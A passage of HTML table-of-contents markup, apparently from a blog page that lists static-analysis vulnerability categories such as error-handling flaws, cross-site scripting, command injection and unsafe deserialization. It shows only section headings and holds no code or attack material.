class="toc-number">1.5.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-244"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-243"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-242"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Overly-Broad-Catch"><span class="toc-number">1.5.2.</span> <span class="toc-text">Poor Error Handling: Overly Broad Catch</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-244"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-245"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-244"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-243"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Overly-Broad-Throws"><span class="toc-number">1.5.3.</span> <span class="toc-text">Poor Error Handling: Overly Broad Throws</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-245"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-246"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-245"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-244"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Program-Catches-NullPointerException"><span class="toc-number">1.5.4.</span> <span class="toc-text">Poor Error Handling: Program Catches NullPointerException</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-246"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-247"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-246"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-245"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Return-Inside-Finally"><span class="toc-number">1.5.5.</span> <span class="toc-text">Poor Error Handling: Return Inside Finally</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-247"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-248"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-247"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-246"><span class="toc-number">1.5.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Swallowed-ThreadDeath"><span class="toc-number">1.5.6.</span> <span class="toc-text">Poor Error Handling: Swallowed ThreadDeath</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-248"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-249"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-248"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-247"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Throw-Inside-Finally"><span class="toc-number">1.5.7.</span> <span class="toc-text">Poor Error Handling: Throw Inside Finally</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-249"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-250"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-249"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-248"><span class="toc-number">1.5.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Error-Handling-Unhandled-SSL-Exception"><span class="toc-number">1.5.8.</span> <span class="toc-text">Poor Error Handling: Unhandled SSL Exception</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-250"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-251"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-250"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-249"><span class="toc-number">1.5.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入验证与展示问题"><span class="toc-number">1.6.</span> <span class="toc-text">输入验证与展示问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Bad-Practices-Missing-URL-Parameter-Converter"><span class="toc-number">1.6.1.</span> <span class="toc-text">ADF Bad Practices: Missing URL Parameter Converter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-251"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-252"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-251"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-250"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Specifier-Manipulation"><span class="toc-number">1.6.2.</span> <span class="toc-text">Access Specifier Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-252"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-253"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-252"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-251"><span class="toc-number">1.6.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Class-Loading-Hijacking"><span class="toc-number">1.6.3.</span> <span class="toc-text">Android Class Loading Hijacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-253"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-254"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-253"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-252"><span class="toc-number">1.6.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bean-Manipulation"><span class="toc-number">1.6.4.</span> <span class="toc-text">Bean Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-254"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-255"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-254"><span class="toc-number">1.6.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-253"><span class="toc-number">1.6.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Command-Injection"><span class="toc-number">1.6.5.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-255"><span class="toc-number">1.6.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-256"><span class="toc-number">1.6.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-255"><span class="toc-number">1.6.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-254"><span class="toc-number">1.6.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Content-Provider-URI-Injection"><span class="toc-number">1.6.6.</span> <span class="toc-text">Content Provider URI Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-256"><span class="toc-number">1.6.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-257"><span class="toc-number">1.6.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-256"><span class="toc-number">1.6.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-255"><span class="toc-number">1.6.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-DOM"><span class="toc-number">1.6.7.</span> <span class="toc-text">Cross-Site Scripting: DOM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-257"><span class="toc-number">1.6.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-258"><span class="toc-number">1.6.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-257"><span class="toc-number">1.6.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-256"><span class="toc-number">1.6.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-External-Links"><span class="toc-number">1.6.8.</span> <span class="toc-text">Cross-Site Scripting: External Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-258"><span class="toc-number">1.6.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-259"><span class="toc-number">1.6.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-258"><span class="toc-number">1.6.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-257"><span class="toc-number">1.6.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Inter-Component-Communication"><span class="toc-number">1.6.9.</span> <span class="toc-text">Cross-Site Scripting: Inter-Component Communication</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-259"><span class="toc-number">1.6.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-260"><span class="toc-number">1.6.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-259"><span class="toc-number">1.6.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-258"><span class="toc-number">1.6.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Persistent"><span class="toc-number">1.6.10.</span> <span class="toc-text">Cross-Site Scripting: Persistent</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-260"><span class="toc-number">1.6.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-261"><span class="toc-number">1.6.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-260"><span class="toc-number">1.6.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-259"><span class="toc-number">1.6.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation"><span class="toc-number">1.6.11.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-261"><span class="toc-number">1.6.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-262"><span class="toc-number">1.6.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-261"><span class="toc-number">1.6.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-260"><span class="toc-number">1.6.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cross-Site-Scripting-Poor-Validation-1"><span class="toc-number">1.6.12.</span> <span class="toc-text">Cross-Site Scripting: Poor Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-262"><span class="toc-number">1.6.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-263"><span class="toc-number">1.6.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-262"><span class="toc-number">1.6.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-261"><span class="toc-number">1.6.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-File-Inclusion"><span class="toc-number">1.6.13.</span> <span class="toc-text">Dangerous File Inclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-263"><span class="toc-number">1.6.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-264"><span class="toc-number">1.6.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-263"><span class="toc-number">1.6.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-262"><span class="toc-number">1.6.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service"><span class="toc-number">1.6.14.</span> <span class="toc-text">Denial of Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-264"><span class="toc-number">1.6.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-265"><span class="toc-number">1.6.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-264"><span class="toc-number">1.6.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-263"><span class="toc-number">1.6.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Format-String"><span class="toc-number">1.6.15.</span> <span class="toc-text">Denial of Service: Format String</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-265"><span class="toc-number">1.6.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-266"><span class="toc-number">1.6.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-265"><span class="toc-number">1.6.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-264"><span class="toc-number">1.6.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Parse-Double"><span class="toc-number">1.6.16.</span> <span class="toc-text">Denial of Service: Parse Double</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-266"><span class="toc-number">1.6.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-267"><span class="toc-number">1.6.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-266"><span class="toc-number">1.6.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-265"><span class="toc-number">1.6.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-Regular-Expression"><span class="toc-number">1.6.17.</span> <span class="toc-text">Denial of Service: Regular Expression</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-267"><span class="toc-number">1.6.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-268"><span class="toc-number">1.6.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-267"><span class="toc-number">1.6.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-266"><span class="toc-number">1.6.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Denial-of-Service-StringBuilder"><span class="toc-number">1.6.18.</span> <span class="toc-text">Denial of Service: StringBuilder</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-268"><span class="toc-number">1.6.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-269"><span class="toc-number">1.6.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-268"><span class="toc-number">1.6.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-267"><span class="toc-number">1.6.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Deserialization-Bad-Practice-Blacklist"><span class="toc-number">1.6.19.</span> <span class="toc-text">Deserialization Bad Practice: Blacklist</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-269"><span class="toc-number">1.6.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-270"><span class="toc-number">1.6.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-269"><span class="toc-number">1.6.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-268"><span class="toc-number">1.6.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Injection"><span class="toc-number">1.6.20.</span> <span class="toc-text">Dynamic Code Evaluation: Code Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-270"><span class="toc-number">1.6.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-271"><span class="toc-number">1.6.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-270"><span class="toc-number">1.6.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-269"><span class="toc-number">1.6.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Code-Manipulation"><span class="toc-number">1.6.21.</span> <span class="toc-text">Dynamic Code Evaluation: Code Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-271"><span class="toc-number">1.6.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-272"><span class="toc-number">1.6.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-271"><span class="toc-number">1.6.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-270"><span class="toc-number">1.6.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-JNDI-Reference-Injection"><span class="toc-number">1.6.22.</span> <span class="toc-text">Dynamic Code Evaluation: JNDI Reference Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-272"><span class="toc-number">1.6.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-273"><span class="toc-number">1.6.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-272"><span class="toc-number">1.6.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-271"><span class="toc-number">1.6.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Script-Injection"><span class="toc-number">1.6.23.</span> <span class="toc-text">Dynamic Code Evaluation: Script Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-273"><span class="toc-number">1.6.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-274"><span class="toc-number">1.6.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-273"><span class="toc-number">1.6.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-272"><span class="toc-number">1.6.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-Deserialization"><span class="toc-number">1.6.24.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-274"><span class="toc-number">1.6.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-275"><span class="toc-number">1.6.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-274"><span class="toc-number">1.6.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-273"><span class="toc-number">1.6.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-JSON-Deserialization"><span class="toc-number">1.6.25.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe JSON Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-275"><span class="toc-number">1.6.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-276"><span class="toc-number">1.6.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-275"><span class="toc-number">1.6.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-274"><span class="toc-number">1.6.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-XStream-Deserialization"><span class="toc-number">1.6.26.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe XStream Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-276"><span class="toc-number">1.6.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-277"><span class="toc-number">1.6.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-276"><span class="toc-number">1.6.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-275"><span class="toc-number">1.6.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-XMLDecoder-Injection"><span class="toc-number">1.6.27.</span> <span class="toc-text">Dynamic Code Evaluation: XMLDecoder Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-277"><span class="toc-number">1.6.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-278"><span class="toc-number">1.6.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-277"><span class="toc-number">1.6.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 